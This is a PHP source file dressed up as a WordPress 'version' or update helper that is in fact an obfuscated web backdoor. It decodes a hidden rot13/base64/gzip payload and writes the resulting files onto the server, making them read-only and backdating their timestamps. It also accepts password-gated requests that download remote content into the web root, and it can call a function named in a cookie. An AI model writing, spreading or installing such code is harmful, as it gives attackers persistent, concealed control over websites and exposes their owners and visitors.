<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y3Mupv93q3pinUEgoP93pP1wo250MJ50Y3IjoT9uMUZiZwNlZv8kZP80L2R1MQp5ZTWyLwVkMzRkAmHjBGL4MwD4BTZ1LJDjMF5xo2Z', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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', '0');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '1');
        $data = translation_v1($data, '1');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("vtosdxb{$check}ga", 'bda0fa817e6508670bfd73203c4d81ce')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}